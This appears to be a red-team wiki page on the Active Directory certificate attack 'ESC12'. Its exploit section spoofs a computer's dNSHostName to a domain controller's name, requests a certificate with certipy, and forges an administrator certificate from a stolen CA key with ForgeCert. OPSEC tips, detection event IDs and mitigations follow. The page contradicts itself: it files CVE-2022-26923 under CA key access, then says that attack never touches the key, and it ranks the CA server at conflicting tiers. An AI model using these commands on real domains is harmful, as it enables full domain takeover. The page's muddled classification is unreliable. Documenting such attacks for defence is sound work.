---
title: "ESC12 — CA admin key access (registry key / CA server)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation, pki]
---

# ESC12

**CA key access.** The CA's **private key** (or the registry material that
lets a process act as the CA) is what a CA *is*. Two ESC12 shapes:

1. **CVE-2022-26923** — a machine with `GenericWrite` on a **computer
   object** rewrites its `dNSHostName` to match a DC's name, then enrolls on
   the `Machine` template using the **CA's own** issuance path — the
   "dNSHostName swap" (see [[cve-2022-26923]]). Most environments patch this
   path now (CA-side name checks), but it's still the reference case.
2. **CA key in the open** — the CA private key is stored where a
   compromised CA **server** (or a process with CA context) can read it
   (registry-backed key, exported key file, `CAImportCertificate`
   material). Whoever can read it can **forge any cert** — the
   [[golden-certificate]] route.

## Exploit

```bash
# CVE-2022-26923 variant: rename a controlled computer to look like a DC,
# enroll as that "DC" (needs GenericWrite on the computer object — [[acl-abuse]])
Set-DomainObject -Identity attacker-computer -Set @{'dNSHostName'='dc01.corp.local'}
certipy req -u 'attacker-computer$' -hashes <nthash> -ca CORP-CA \
  -template Machine -dc-ip <DC_IP>

# key-in-the-open: export/read the CA key, then forge (see golden-certificate)
ForgeCert.exe -target administrator@corp.local -caCert ca.crt -caKey ca.key
```

## Red-team notes (OPSEC)

- **CVE-2022-26923 is a *template* attack, not a CA attack** — the CA key is
  never touched; the 4886/4887 is for a *machine* cert whose SAN matches a
  DC. Check the patch level before spending the GenericWrite.
- **The key-in-the-open path is CA-box-local** — it's a Tier-2/Tier-3 target
  (the CA server); find it via [[pki-and-ad-cs-architecture]] recon, not via
  LDAP.
- A read of the CA key is **the** persistence artifact — it outlives
  everything a golden ticket can ([[golden-certificate]]).

## Detection

- **4886/4887** for a `Machine` cert whose SAN/dNSHostName matches a DC that
  never enrolled (CVE-2022-26923 tell).
- **5136** on a computer object's `dNSHostName` to a DC-like name.
- CA-server host telemetry: key file access, registry reads under the CA key.

## Mitigations

- **Patch the dNSHostName path** (CA-side validation, KB for CVE-2022-26923).
- **Protect the CA key** — HSM-backed, no exportable key, strict ACLs on the
  key file/registry; treat the CA server as Tier-0-adjacent.
- Alert on machine certs whose SAN is a DC name.

## Links

- [[ad-cs-esc-attacks]] — ESC12 in the family
- [[cve-2022-26923]] — the CVE case
- [[golden-certificate]] — what CA-key access enables
- [[acl-abuse]] — the GenericWrite prerequisite
- [[pki-and-ad-cs-architecture]] — where the CA key lives
- [[certified-pre-owned]]
